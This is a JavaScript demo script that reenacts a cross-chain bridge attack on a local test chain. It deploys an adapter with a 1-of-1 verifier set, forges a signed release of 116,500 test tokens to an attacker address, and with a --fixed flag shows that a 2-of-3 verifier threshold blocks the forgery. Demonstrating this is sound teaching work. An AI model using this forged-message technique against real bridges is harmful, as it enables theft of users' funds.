// Attack #1: one verifier, one yes. Our adapter trusts a 1-of-1 verifier set. We hold that
// verifier's key (in the real incident its data sources were poisoned) and sign a message
// that chain A never sent.
//   node demos/01-onev.mjs           1-of-1: the forged message releases 116,500
//   node demos/01-onev.mjs --fixed   2-of-3 independent verifiers: one signature is not enough
import { keccak256, encodeAbiParameters } from "viem";
import { startChain, stopChains, roles, verifiers, abis, sigsFrom, units, fmt, short } from "../lib/chain.mjs";
import { session } from "../lib/term.mjs";

const fixed = process.argv.includes("--fixed");
const t = session(fixed ? "onev-fixed" : "onev", fixed ? "One verifier, fixed" : "One verifier");
const CHAIN_A = 1001n;
const B = await startChain({ id: 31338, name: "chain B" });

const token = await B.deploy("token", ["Test rsETH", "tRSETH", 18]);
// --fixed only picks the deployed configuration: which verifiers, how many must agree.
const set = fixed ? verifiers : [verifiers[0]];
const need = fixed ? 2n : 1n;
const adapter = await B.deploy("adapter", [token, CHAIN_A, set.map((v) => v.address), need]);
await B.send(roles.relayer, token, abis.token, "mint", [adapter, units(650_000)]);

const threshold = await B.read(adapter, abis.adapter, "threshold");
const registered = (await Promise.all(verifiers.map((v) => B.read(adapter, abis.adapter, "isVerifier", [v.address])))).filter(Boolean).length;
t.say(`adapter on chain B holds ${fmt(await B.balanceOf(token, adapter))} tRSETH`);
t.note(`required verifiers: ${threshold} of ${registered}`);

// Chain A never emitted this message. The verifier whose key we hold signs it anyway.
const msg = { srcChain: CHAIN_A, dstChain: B.id, nonce: 7n, to: roles.attacker.address, amount: units(116_500) };
t.cmd(`chain A sent nothing · verifier ${short(verifiers[0].address)} signs:`);
t.say(`  release 116,500 tRSETH → ${short(roles.attacker.address)}`);
const d = keccak256(encodeAbiParameters(
  [{ type: "tuple", components: [{ name: "srcChain", type: "uint256" }, { name: "dstChain", type: "uint256" }, { name: "nonce", type: "uint256" }, { name: "to", type: "address" }, { name: "amount", type: "uint256" }] }],
  [msg]));
const sigs = await sigsFrom([verifiers[0]], d);
t.cmd(`attacker → adapter.release(msg, [1 signature])`);
const r = await B.attempt(roles.attacker, adapter, abis.adapter, "release", [msg, sigs]);
const got = await B.balanceOf(token, roles.attacker.address);
if (r.ok) t.bad(`  ✓ RELEASED → attacker holds ${fmt(got)} tRSETH`);
else t.ok(`  ✗ reverted: ${r.name}`);
// The verdict comes from the attacker's balance, not from the flag.
t.big(got === 0n ? `NOTHING RELEASED · adapter keeps ${fmt(await B.balanceOf(token, adapter))}` : `FORGED MESSAGE PAID ${fmt(got)} tRSETH`);
t.save(); stopChains(); process.exit(0);
